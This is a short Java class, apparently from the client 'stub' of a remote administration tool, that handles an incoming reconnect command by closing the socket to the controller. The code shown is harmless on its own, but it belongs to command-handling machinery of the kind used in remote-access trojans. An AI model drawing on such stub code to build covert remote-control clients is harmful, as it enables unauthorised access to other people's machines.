package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;

public class Packet45Reconnect extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.socket.close();
	}

}
